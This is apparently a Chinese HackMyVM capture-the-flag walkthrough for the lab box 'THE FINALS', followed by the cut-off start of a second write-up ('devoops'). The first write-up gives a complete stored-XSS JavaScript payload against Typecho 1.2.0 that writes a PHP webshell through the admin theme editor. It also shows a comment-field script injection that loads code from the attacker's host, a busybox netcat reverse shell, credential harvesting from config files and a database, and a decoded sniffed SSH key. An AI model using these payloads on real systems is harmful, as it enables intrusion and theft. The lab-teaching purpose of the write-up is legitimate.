ËÆøÈóÆÁõÆÊ†á‰∏ªÊú∫ÁöÑ 80 Á´ØÂè£ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Âêç‰∏∫ 'THE FINALS' ÁöÑÈùôÊÄÅÁΩëÁ´ôÔºåÈ°µÈù¢Ê∫êÁ†ÅÊòæÁ§∫ËøôÊòØ‰∏Ä‰∏™Âü∫‰∫éÊ®°ÊùøÁöÑÁΩëÁ´ôÔºåÊ≤°ÊúâÁõ¥Êé•ÂèØÂà©Áî®ÁöÑ‰ø°ÊÅØ„ÄÇ

‰ΩøÁî®ÁõÆÂΩïÊâ´ÊèèÂ∑•ÂÖ∑ `dirsearch` Ëøõ‰∏ÄÊ≠•Êé¢Êµã Web ÊúçÂä°ÁöÑÁõÆÂΩïÁªìÊûÑ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.157
...
[10:46:28] 200 -   17KB - /blog/
[10:46:28] 200 -  820B  - /cgi-bin/printenv
[10:46:28] 200 -    1KB - /cgi-bin/test-cgi
...
```

Êâ´ÊèèÁªìÊûúÂèëÁé∞ `/cgi-bin/printenv` Âíå `/cgi-bin/test-cgi` ‰∏§‰∏™ CGI ËÑöÊú¨Ôºå‰ΩÜËÆøÈóÆÂêéÂèëÁé∞ÂÆÉ‰ª¨Âè™ÊòØÁî®‰∫éÊµãËØïÁöÑÁ§∫‰æãËÑöÊú¨ÔºåÂπ∂Êú™ÊâßË°åÔºåÊ≤°ÊúâÂÆûÈôÖÂà©Áî®‰ª∑ÂÄº„ÄÇ

ÂÖ≥ÈîÆÂèëÁé∞ÊòØ `/blog/` ÁõÆÂΩï„ÄÇËÆøÈóÆËØ•ÁõÆÂΩï `http://192.168.205.157/blog/`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ Typecho ÂçöÂÆ¢Á≥ªÁªü„ÄÇ‰∏∫‰∫ÜÊñπ‰æøÂêéÁª≠Êìç‰ΩúÔºåÂ∞ÜÂüüÂêç‰∏é IP ÁªëÂÆöÂà∞Êú¨Âú∞ hosts Êñá‰ª∂‰∏≠„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts      
192.168.205.157 THEFINALS.hmv
```

ÈÄöËøáÈ°µÈù¢‰ø°ÊÅØÂíåÁâπÂæÅÂà§Êñ≠ÔºåËØ•ÂçöÂÆ¢Á≥ªÁªüÁâàÊú¨‰∏∫ Typecho 1.2.0„ÄÇ

# ‰∫å„ÄÅÊºèÊ¥ûÂà©Áî® (Typecho 1.2.0 Â≠òÂÇ®Âûã XSS)

## 2.1 ÊºèÊ¥ûÂàÜÊûê

Êü•ËØ¢ÂÖ¨ÂºÄÊºèÊ¥ûÂ∫ìÂèØÁü•ÔºåTypecho 1.2.0 ÁâàÊú¨Â≠òÂú®‰∏Ä‰∏™Â≠òÂÇ®Âûã XSS ÊºèÊ¥ûÔºàÂèÇËÄÉ issue [#1546](https://github.com/typecho/typecho/issues/1546)„ÄÇ

*   **ÊºèÊ¥ûÊàêÂõ†**ÔºöÊºèÊ¥ûÂ≠òÂú®‰∫éÊñáÁ´†ÁöÑËØÑËÆ∫ÂäüËÉΩ‰∏≠„ÄÇÂΩìÁî®Êà∑Êèê‰∫§ËØÑËÆ∫Êó∂ÔºåÂÖ∂Â°´ÂÜôÁöÑ‰∏™‰∫∫ÁΩëÁ´ô URL Â≠óÊÆµÂú®ÂêéÁ´ØÂ§ÑÁêÜÂíåÂâçÁ´ØÊ∏≤ÊüìÊó∂Ê≤°ÊúâËøõË°åÂÖÖÂàÜÁöÑËøáÊª§ÂíåÁºñÁ†Å„ÄÇ
*   **Ëß¶ÂèëÂéüÁêÜ**ÔºöÊîªÂáªËÄÖÂèØ‰ª•Â∞ÜÊÅ∂ÊÑè JavaScript ‰ª£Á†ÅÊûÑÈÄ†Âú® URL Â≠óÊÆµ‰∏≠„ÄÇ‰æãÂ¶ÇÔºåÈÄöËøáÈó≠ÂêàÂâç‰∏Ä‰∏™ `&lt;a&gt;` Ê†áÁ≠æÂπ∂ÊèíÂÖ•‰∏Ä‰∏™Êñ∞ÁöÑ `&lt;script&gt;` Ê†áÁ≠æÔºåÊù•Ê≥®ÂÖ•ÊÅ∂ÊÑèËÑöÊú¨„ÄÇÂΩìÁΩëÁ´ôÁÆ°ÁêÜÂëòÂú®ÂêéÂè∞ÁÆ°ÁêÜËØÑËÆ∫È°µÈù¢Ôºà`manage-comments.php`ÔºâÊü•ÁúãËøôÊù°ÊÅ∂ÊÑèËØÑËÆ∫Êó∂ÔºåËøôÊÆµ JavaScript ‰ª£Á†ÅÂ∞±‰ºöÂú®ÁÆ°ÁêÜÂëòÁöÑÊµèËßàÂô®‰∏≠ÊâßË°å„ÄÇ
*   **Âà©Áî®ÊÄùË∑Ø**ÔºöÂà©Áî®Ëøô‰∏™ XSS ÊºèÊ¥ûÔºåÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†‰∏ÄÊÆµ JavaScript payloadÔºåÂΩìÁÆ°ÁêÜÂëòÊü•ÁúãËØÑËÆ∫Êó∂ÔºåËØ• payload ‰ºöÂú®ÂêéÂè∞Ëá™Âä®ÊâßË°å‰∏ÄÁ≥ªÂàóÊìç‰ΩúÔºå‰æãÂ¶Ç‰øÆÊîπ‰∏ªÈ¢òÊñá‰ª∂ÔºàÂ¶Ç `404.php`ÔºâÂπ∂ÂÜôÂÖ•‰∏Ä‰∏™ webshellÔºå‰ªéËÄåÂÆûÁé∞ÂØπÊúçÂä°Âô®ÁöÑÊéßÂà∂„ÄÇ

## 2.2 ÊûÑÈÄ†Âπ∂ÊâßË°å Payload

Ê†πÊçÆÊºèÊ¥ûÂéüÁêÜÔºåÊàë‰ª¨ÁºñÂÜô‰∏ÄÊÆµ JavaScript payload (`exp.js`)ÔºåÂÖ∂ÂäüËÉΩÊòØÔºö

1.  Âú®ÁÆ°ÁêÜÂëòÂêéÂè∞È°µÈù¢‰∏≠ÔºåÂä®ÊÄÅÂàõÂª∫‰∏Ä‰∏™‰∏çÂèØËßÅÁöÑ iframeÔºåÂä†ËΩΩ‰∏ªÈ¢òÊñá‰ª∂ `404.php` ÁöÑÁºñËæëÈ°µÈù¢„ÄÇ
2.  Âú® iframe Âä†ËΩΩÂÆåÊàêÂêéÔºåÈÄöËøá `onload` ‰∫ã‰ª∂Ëß¶Âèë `writeShell()` ÂáΩÊï∞„ÄÇ
3.  `writeShell()` ÂáΩÊï∞‰ºöÂÆö‰ΩçÂà∞ `404.php` ÁöÑÊñáÊú¨ÁºñËæëÊ°ÜÔºåÂ∞Ü PHP ‰∏ÄÂè•ËØùÊú®È©¨ `&lt;?php system($_GET['a']); ?&gt;` ÂÜôÂÖ•Êñá‰ª∂ÂÜÖÂÆπÁöÑÈ°∂ÈÉ®„ÄÇ
4.  ÊúÄÂêéÔºåÊ®°ÊãüÁÇπÂáª‚Äú‰øùÂ≠òÊñá‰ª∂‚ÄùÊåâÈíÆÔºåÂ∞Ü webshell ÂÜôÂÖ•Âà∞ÊúçÂä°Âô®„ÄÇ

```javascript
// exp.js
var isSaved = false;
var attemptCounter = 0;

function insertIframe() {
    var path = window.location.pathname;
    var adminBase = path.includes('manage-comments.php') 
        ? path.replace('manage-comments.php', '') 
        : '/admin/';
    var themeUrl = adminBase + 'theme-editor.php?theme=default&amp;file=404.php';

    var iframe = `&lt;iframe id='theme_id' src='${themeUrl}' width='0' height='0' onload='writeShell()'&gt;&lt;/iframe&gt;`;
    document.body.innerHTML += iframe;
}

function writeShell() {
    if (isSaved || attemptCounter &gt; 10) return;
    attemptCounter++;

    try {
        var iframeDoc = document.getElementById('theme_id').contentWindow.document;
        var content = iframeDoc.getElementById('content');
        var buttons = iframeDoc.getElementsByTagName('button');

        if (content &amp;&amp; buttons.length &gt; 1) {
            var val = content.value;
            var payload = '&lt;?php system($_GET['a']); ?&gt;\n';
            if (val.indexOf(payload) === -1) {
                content.value = payload + val;
                buttons[1].click();
                isSaved = true;
            }
        }
    } catch (e) {}

    if (!isSaved) {
        setTimeout(writeShell, 500); 
    }
}

insertIframe();
```

Êé•ÁùÄÔºåÂú®Êú¨Âú∞ÔºàKaliÔºâÂºÄÂêØ‰∏Ä‰∏™ HTTP ÊúçÂä°Êù•ÊâòÁÆ° `exp.js`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

ÁÑ∂ÂêéÔºåÂú®ÂçöÂÆ¢ÁöÑÊñáÁ´†ËØÑËÆ∫Âå∫Êèê‰∫§‰∏ÄÊù°ÊÅ∂ÊÑèËØÑËÆ∫ÔºåÂÖ∂‰∏≠ 'Website' Â≠óÊÆµÂ°´ÂÖ•Êàë‰ª¨ÊûÑÈÄ†Â•ΩÁöÑ XSS payloadÔºåÁî®‰∫éÂä†ËΩΩËøúÁ®ãÁöÑ `exp.js` ËÑöÊú¨„ÄÇ

```
http://a.com/'&gt;&lt;/a&gt;&lt;script/src='http://192.168.205.128/exp.js'&gt;&lt;/script&gt;&lt;a/href='#
```

ÂΩìËØÑËÆ∫Êèê‰∫§ÂêéÔºåÁ≠âÂæÖ‰∏ÄÊÆµÊó∂Èó¥ÔºàÊ®°ÊãüÁÆ°ÁêÜÂëòÊü•ÁúãËØÑËÆ∫ÔºâÔºåÊú¨Âú∞ HTTP ÊúçÂä°Âô®‰ºöÊî∂Âà∞Êù•Ëá™ÁõÆÊ†áÊúçÂä°Âô®ÁöÑËØ∑Ê±ÇÔºåËØ¥Êòé XSS Â∑≤ÊàêÂäüËß¶Âèë„ÄÇ

```bash
...
192.168.205.1 - - [24/Aug/2025 10:53:08] 'GET /exp.js HTTP/1.1' 200 -
...
```

## 2.3 Ëé∑Âèñ Webshell Âπ∂ÂèçÂºπ Shell

XSS Ëß¶ÂèëÂêéÔºåwebshell Â∑≤Ë¢´ÂÜôÂÖ• `/usr/themes/default/404.php`„ÄÇÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáËÆøÈóÆËØ•Êñá‰ª∂Âπ∂‰º†ÂÖ•ÂëΩ‰ª§Êù•È™åËØÅ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=id'         
uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)
```

ÂëΩ‰ª§ÊàêÂäüÊâßË°å„ÄÇÊé•‰∏ãÊù•ÔºåÂú® Kali ‰∏äËÆæÁΩÆ `netcat` ÁõëÂê¨ÔºåÂπ∂Âà©Áî® webshell ÊâßË°åÂèçÂºπ shell ÂëΩ‰ª§ÔºåËé∑Âèñ‰∏Ä‰∏™‰∫§‰∫íÂºè Shell„ÄÇ

Kali ÁõëÂê¨Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lnvp 8888
```

ÊâßË°åÂèçÂºπ ShellÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20%2Fbin%2Fash'
```

ÊàêÂäüËé∑ÂèñÂà∞ `apache` Áî®Êà∑ÁöÑ ShellÔºåÂπ∂ÂçáÁ∫ß‰∏∫Á®≥ÂÆöÁöÑ TTY„ÄÇ

# ‰∏â„ÄÅÊ®™ÂêëÁßªÂä®

## 3.1 ‰ø°ÊÅØÊêúÈõÜ

Âú® `apache` Áî®Êà∑ÁöÑ Shell ‰∏≠ÔºåÈ¶ñÂÖàÊü•ÁúãÂçöÂÆ¢ÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåËé∑ÂèñÊï∞ÊçÆÂ∫ìÂá≠ÊçÆ„ÄÇ

```bash
/var/www/html/blog $ cat config.inc.php
...
$db-&gt;addServer(array (
  'host' =&gt; 'localhost',
  'port' =&gt; 3306,
  'user' =&gt; 'typecho_u',
  'password' =&gt; 'QLTkbviW71CSRZtGWIQdB6s',
  'database' =&gt; 'typecho_db',
...
```

‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ÊçÆËøûÊé•Êï∞ÊçÆÂ∫ìÔºåÂπ∂Êü•ËØ¢ `typecho_users` Ë°®ÔºåÊâæÂà∞‰∫Ü `staff` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇÂ∞ùËØïÁ†¥Ëß£ËØ•ÂìàÂ∏åÊú™ÊûúÔºåÂà§Êñ≠‰∏∫ÂÖîÂ≠êÊ¥û„ÄÇ

```bash
/var/www/html/blog $ mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s typecho_db -e 'select * from typecho_users;'
...
|   1 | staff | $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | ...
...
```

Êé•ÁùÄÔºåÊ£ÄÊü• `/home` ÁõÆÂΩïÔºåÂèëÁé∞‰∫Ü `june`, `scotty`, `staff` ‰∏â‰∏™Áî®Êà∑„ÄÇÂú® `/home/june` ÁõÆÂΩï‰∏ãÂèëÁé∞ `message.txt`ÔºåÂÜÖÂÆπÊèêÂà∞‰∫Ü 'BROADCAST' Âíå 'CNS'ÔºåËøôÊòØ‰∏Ä‰∏™ÈáçË¶ÅÁ∫øÁ¥¢„ÄÇ

ÈÄöËøá `find` ÂëΩ‰ª§Êü•ÊâæÂ±û‰∫é `scotty` Áî®Êà∑ÁöÑÊñá‰ª∂ÔºåÂèëÁé∞‰∫ÜÊó•ÂøóÊñá‰ª∂ `/var/log/scotty-main.log`„ÄÇ

```bash
/home/june $ head -n 10 /var/log/scotty-main.log
Broadcast to eth0 192.168.11.255:1337
...
```

Êó•ÂøóÊòæÁ§∫ÔºåÁ≥ªÁªüÊ≠£Âú®Âêë `192.168.11.255` ÁöÑ 1337 Á´ØÂè£ËøõË°å UDP ÂπøÊí≠„ÄÇ

## 3.2 ÊµÅÈáèÁõëÂê¨‰∏éÂá≠ÊçÆËé∑Âèñ

Ê†πÊçÆÊó•ÂøóÊñá‰ª∂ÁöÑÁ∫øÁ¥¢ÔºåÂú® Kali ‰∏ä‰ΩøÁî® `tcpdump` ÁõëÂê¨Êù•Ëá™ÁõÆÊ†á‰∏ªÊú∫ÁöÑÊµÅÈáè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo tcpdump -A host 192.168.205.157
...
E..@..@.@. ............9.,V&lt;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
```

ÊçïËé∑Âà∞‰∫Ü‰∏ÄÊÆµ Base64 ÁºñÁ†ÅÁöÑÊï∞ÊçÆ„ÄÇÂØπÂÖ∂ËøõË°åËß£Á†ÅÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ SSH ÁßÅÈí•„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo '...' | base64 -d &gt; /tmp/id_rsa
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

‰øùÂ≠òÁßÅÈí•Âπ∂Ëµã‰∫à `600` ÊùÉÈôê„ÄÇÈÄöËøá `ssh-keygen` Êü•ÁúãÂÖ∂ÂÖ≥ËÅîÁî®Êà∑ÔºåÂèëÁé∞ÊòØ `root@thefinals.hmv`„ÄÇÁÑ∂ËÄåÔºåÂ∞ùËØï‰ΩøÁî®ËØ•ÁßÅÈí•‰ª• `root` Ë∫´‰ªΩÁôªÂΩïÂ§±Ë¥•„ÄÇËøõ‰∏ÄÊ≠•Â∞ùËØï‰ª• `scotty` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩïÔºåÊàêÂäü„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ chmod 600 /tmp/id_rsa
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh scotty@192.168.205.157 -i /tmp/id_rsa

thefinals:~$ id
uid=1002(scotty) gid=100(users) groups=100(users),100(users)
```

ÊàêÂäüÊ®™ÂêëÁßªÂä®Âà∞ `scotty` Áî®Êà∑„ÄÇ

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá

## 4.1 Sudo ÊùÉÈôêÂàÜÊûê

‰ª• `scotty` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩïÂêéÔºåÁ´ãÂç≥Ê£ÄÊü• `sudo` ÊùÉÈôê„ÄÇ

```bash
thefinals:~$ sudo -l
...
User scotty may run the following commands on thefinals:
    (ALL) NOPASSWD: /sbin/secret
```

`scotty` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª• `root` ÊùÉÈôêÊâßË°å `/sbin/secret`„ÄÇÂ∞ùËØïÁõ¥Êé•ËøêË°åËØ•ÂëΩ‰ª§„ÄÇ

```bash
thefinals:~$ sudo /sbin/secret
/sbin/secret: line 2: can't create /dev/pts/99: Permission denied
```

Á®ãÂ∫èÊâßË°åÂ§±Ë¥•ÔºåÈîôËØØ‰ø°ÊÅØË°®ÊòéÂÆÉÂ∞ùËØïÂêë `/dev/pts/99` Ëøô‰∏™‰º™ÁªàÁ´ØÔºàTTYÔºâËÆæÂ§áÊñá‰ª∂ÂÜôÂÖ•ÂÜÖÂÆπÊó∂ÊùÉÈôê‰∏çË∂≥„ÄÇËøôÊè≠Á§∫‰∫ÜÊèêÊùÉÁöÑÂÖ≥ÈîÆÔºöÊàë‰ª¨ÈúÄË¶ÅËÆ©Ëá™Â∑±ËøõÂÖ• `/dev/pts/99` Ëøô‰∏™ TTY ‰ºöËØù„ÄÇ

## 4.2 TTY Âç†Áî®‰∏éÊèêÊùÉ

Á≥ªÁªüÂàÜÈÖç TTY ÁºñÂè∑ÊòØÈ°∫Â∫èÁöÑ„ÄÇ‰∏∫‰∫ÜËé∑Âæó `/dev/pts/99`ÔºåÊàë‰ª¨ÈúÄË¶ÅÂÖàÂàõÂª∫Âπ∂Âç†Áî®Êéâ‰ªé 0 Âà∞ 98 ÁöÑÊâÄÊúâ TTY„ÄÇ

Áî±‰∫éÁõÆÊ†áÁ≥ªÁªü‰∏äÊ≤°ÊúâÂÆâË£Ö `screen` Êàñ `tmux` Á≠âÂ∑•ÂÖ∑ÔºåÊàë‰ª¨ÈÄâÊã©‰ΩøÁî® `python` ÁöÑ `pty` Ê®°ÂùóÊù•ÁîüÊàêÊñ∞ÁöÑ TTY ‰ºöËØù„ÄÇ

1. **ÊâπÈáèÂàõÂª∫ÂêéÂè∞ TTY**Ôºö
   ÁºñÂÜô‰∏Ä‰∏™ `while` Âæ™ÁéØÔºåÂú®ÂêéÂè∞ÂêØÂä® 9* ‰∏™Êñ∞ÁöÑ TTY ‰ºöËØùÔºå‰ª•Âç†Áî® `/dev/pts/0` Âà∞ `/dev/pts/9*`ÔºàËøôÈáåÂ∞±Âà∞‰∏Ä‰∏™Â§ßÊ¶ÇËåÉÂõ¥ÔºåÁÑ∂ÂêéÊü•ÁúãttyËá™Â∑±ÂæÆË∞ÉÂà∞98Â∞±Â•Ω‰∫ÜÔºâ„ÄÇ

   ```bash
   thefinals:~$ i=0; while [ $i -lt 95 ]; do python -c 'import pty; pty.spawn('/bin/ash')' &amp; i=$((i+1)); done
   ```

*ps:ÊàëËøôËÇØÂÆöÊòØÊ≤°Âà∞98ÁöÑÔºåËá™Â∑±Êü•ÁúãttyËøõË°åË∞ÉÊï¥*

1. **ÂàõÂª∫ÁõÆÊ†á TTY**Ôºö
   Áé∞Âú®ÔºåÂÜçÂàõÂª∫‰∏Ä‰∏™**ÂâçÂè∞**ÁöÑ TTY ‰ºöËØùÔºåËøô‰∏™‰ºöËØùÂ∞ÜË¢´ÂàÜÈÖçÂà∞ÁºñÂè∑ `/dev/pts/98`„ÄÇ

   ```bash
   thefinals:~$ python -c 'import pty; pty.spawn('/bin/ash')'
   ~ $ tty
   /dev/pts/98
   ```

   (ËøôÈáåÂèëÁé∞ÈúÄË¶Å99‰∏™‰ºöËØùÔºå‰∏çÊòØ98‰∏™ÔºåÊïÖÂÜçË°•‰∏ä)

2. **Ëé∑ÂèñÂá≠ÊçÆ**Ôºö
   Âú® `/dev/pts/98` (ÂÆûÈôÖ‰∏∫ `/dev/pts/99`ÔºåÂõ†‰∏∫‰ªé0ÂºÄÂßã) ÁöÑ TTY ‰∏≠ÔºåÂÜçÊ¨°ÊâßË°å `sudo` ÂëΩ‰ª§„ÄÇ

   ```bash
   ~ $ sudo /sbin/secret
   root:p8RuoQGTtlKLAjuF1Tpy5wX
   ```

   ËøôÊ¨°ÂëΩ‰ª§ÊàêÂäüÊâßË°åÔºåÂπ∂ËæìÂá∫‰∫Ü‰∏ÄÂØπÂá≠ÊçÆ„ÄÇËøôÁúãËµ∑Êù•ÂÉèÊòØÊï∞ÊçÆÂ∫ìÁöÑ root Áî®Êà∑ÂØÜÁ†Å„ÄÇ

## 4.3 Ëé∑ÂèñÊúÄÁªà Root ÊùÉÈôê

‰ΩøÁî®‰∏ä‰∏ÄÊ≠•Ëé∑ÂèñÁöÑÂØÜÁ†ÅÂ∞ùËØïËøûÊé•Êú¨Âú∞ MySQL/MariaDB ÊúçÂä°„ÄÇ

```bash
~ $ mysql -u root -pp8RuoQGTtlKLAjuF1Tpy5wX secret -e 'select * from user;'
...
+----+----------+-------------------------+
| id | username | password                |
+----+----------+-------------------------+
|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |
+----+----------+-------------------------+
```

Âú® `secret` Êï∞ÊçÆÂ∫ìÁöÑ `user` Ë°®‰∏≠ÔºåÂèëÁé∞‰∫Ü `root` Áî®Êà∑ÁöÑÂØÜÁ†Å `BvIpFDyB4kNbkyqJGwMzLcK`„ÄÇ‰ΩøÁî®Ëøô‰∏™ÂØÜÁ†ÅÂàáÊç¢Âà∞ `root` Áî®Êà∑„ÄÇ

```bash
~ $ su -
Password: BvIpFDyB4kNbkyqJGwMzLcK
thefinals:~# id
uid=0(root) gid=0(root) groups=0(root),...
```

ÊàêÂäüÂàáÊç¢Âà∞ `root` Áî®Êà∑„ÄÇÊúÄÂêéÔºåËØªÂèñ‰Ωç‰∫é `/root/root.flag` Âíå `/home/june/user.flag` ÁöÑ‰∏§‰∏™ flag Êñá‰ª∂ÔºåÂÆåÊàêÊåëÊàò„ÄÇ

```bash
thefinals:~# cat /root/root.flag
flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}

thefinals:~# cat /home/june/user.flag
flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_thefinals.html</guid><pubDate>Sun, 24 Aug 2025 15:29:58 +0000</pubDate></item><item><title>hmv_devoops</title><link>https://7r1UMPHK.github.io/post/hmv_devoops.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºå‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑ÂØπÂΩìÂâçÂ±ÄÂüüÁΩëËøõË°åÊâ´ÊèèÔºå‰ª•ÂèëÁé∞Â≠òÊ¥ª‰∏ªÊú∫Âπ∂Á°ÆÂÆöÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                               
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:df:47:90       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.149`„ÄÇ

Êé•ÁùÄÔºå‰ΩøÁî®`nmap`ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 07:29 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00020s latency).
Not shown: 65535 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp
MAC Address: 08:00:27:DF:47:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫‰ªÖÂºÄÊîæ‰∫Ü 3000 Á´ØÂè£„ÄÇ

‰ΩøÁî®`curl`ËÆøÈóÆËØ•Á´ØÂè£Êèê‰æõÁöÑWebÊúçÂä°ÔºåÊü•ÁúãÈ°µÈù¢Ê∫ê‰ª£Á†Å„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.149:3000                                                               
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
  &lt;head&gt;
    &lt;script type='module' src='/@vite/client'&gt;&lt;/script&gt;
...
    &lt;title&gt;Vite + Vue&lt;/title&gt;
...
    &lt;script type='module' src='/src/main.js'&gt;&lt;/script&gt;
...
&lt;/html&gt;
```

‰ªéËøîÂõûÁöÑHTMLÂÜÖÂÆπÂèØ‰ª•Âà§Êñ≠ÔºåËøôÊòØ‰∏Ä‰∏™Âü∫‰∫é Vite Âíå Vue ÊûÑÂª∫ÁöÑÂâçÁ´ØÈ°πÁõÆ„ÄÇVite ÊòØ‰∏Ä‰∏™Áé∞‰ª£ÂåñÁöÑÂâçÁ´ØÊûÑÂª∫Â∑•ÂÖ∑ÔºåÂÖ∂Âú®ÂºÄÂèëÊ®°Âºè‰∏ã‰ºöÊèê‰æõ‰∏Ä‰∏™ÂºÄÂèëÊúçÂä°Âô®„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂà©Áî®**

Â∞ùËØïËØªÂèñËØ•ViteÈ°πÁõÆÁöÑÈÖçÁΩÆÊñá‰ª∂`vite.config.js`Ôºå‰ª•‰∫ÜËß£ÂÖ∂ÂêéÁ´Ø‰ª£ÁêÜÂíåÂÆâÂÖ®ËÆæÁΩÆ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.149:3000/vite.config.js 
import { defineConfig } from '/node_modules/.vite/deps/vite.js?v=4e07dcb1'
...
export default defineConfig({
  plugins: [vue()],
  server: {
    proxy: {
      '/sign': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) =&gt; path.replace(/^\/sign/, '/api/sign')
      },
      '/execute': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) =&gt; path.replace(/^\/execute/, '/api/execute')
      }
    },
    fs: {
      deny: ['.env', '.env.*', '*.{crt,pem}', '**/.git/**', 'package.json'],
    }
  },
})
```

ÈÖçÁΩÆÊñá‰ª∂Êö¥Èú≤‰∫Ü‰∏§‰∏™API‰ª£ÁêÜË∑ØÂæÑ `/sign` Âíå `/execute`ÔºåÂÆÉ‰ª¨ÈÉΩË¢´ËΩ¨ÂèëÂà∞Êú¨Âú∞ÁöÑ `http://localhost:3001` ÊúçÂä°„ÄÇÂêåÊó∂Ôºå`fs.deny` ÈÖçÁΩÆÈ°πËØïÂõæÈòªÊ≠¢ÂØπ `.env` Á≠âÊïèÊÑüÊñá‰ª∂ÁöÑÁõ¥Êé•ËÆøÈóÆ„ÄÇ

